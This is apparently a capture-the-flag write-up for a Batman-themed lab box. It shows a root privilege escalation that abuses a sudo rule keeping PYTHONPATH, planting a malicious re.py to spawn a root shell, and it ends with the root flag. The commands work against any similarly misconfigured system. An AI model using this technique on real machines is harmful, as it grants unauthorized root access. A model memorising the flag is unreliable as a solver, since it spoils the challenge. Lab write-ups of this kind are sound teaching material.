# Find all the flags and discover Batman's secret! — Part 2: root.txt

## Techniques used

- sudo privilege enumeration
- Interactive shell stabilization (pty)
- Python module hijacking via `PYTHONPATH`

## Tools used

- sudo
- python3
- bash

## Commands and output

### 1. Checking sudo privileges

```bash
$ sudo -l
```

```text
Matching Defaults entries for bruce on gotham:
    mail_badpass, env_keep+=PYTHONPATH, use_pty

User bruce may run the following commands on gotham:
    (root) NOPASSWD: /usr/bin/python3 /opt/scanner/gotham_scanner.py
```

`env_keep+=PYTHONPATH` preserves the variable through `sudo` — combined with `gotham_scanner.py` importing `time` and `re`, this allows a Python module hijack.

### 2. Stabilizing the shell

```bash
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
```

### 3. Hijacking `time` (failed — builtin module)

```bash
$ printf 'import os\nos.system("/bin/bash")\n' > /tmp/priv/time.py
$ export PYTHONPATH=/tmp/priv
$ sudo /usr/bin/python3 /opt/scanner/gotham_scanner.py
```

```text
=== Wayne Enterprises Secure Console ===
...
⌁ End of transmission.
```

`time` is a C builtin compiled into the interpreter — it cannot be shadowed via `PYTHONPATH`.

### 4. Hijacking `re` (success — pure Python module)

```bash
$ printf 'import os\nos.system("/bin/bash")\n' > /tmp/priv/re.py
$ chmod 644 /tmp/priv/re.py
$ python3 -c "import re; print(re.__file__)"
```

```text
/tmp/priv/re.py
```

```bash
$ sudo /usr/bin/python3 /opt/scanner/gotham_scanner.py
```

```text
root@gotham:/#
```

### 5. Reading root.txt

```bash
$ cd /root
$ ls
$ cat root.txt
```

```text
EPI{8ruc3_W4yn3_15_7ru1Y_84tm4n}
```

## Evidence

- Privesc vector: `PYTHONPATH` module hijack (`re` module) via NOPASSWD sudo entry
- root.txt: `EPI{8ruc3_W4yn3_15_7ru1Y_84tm4n}`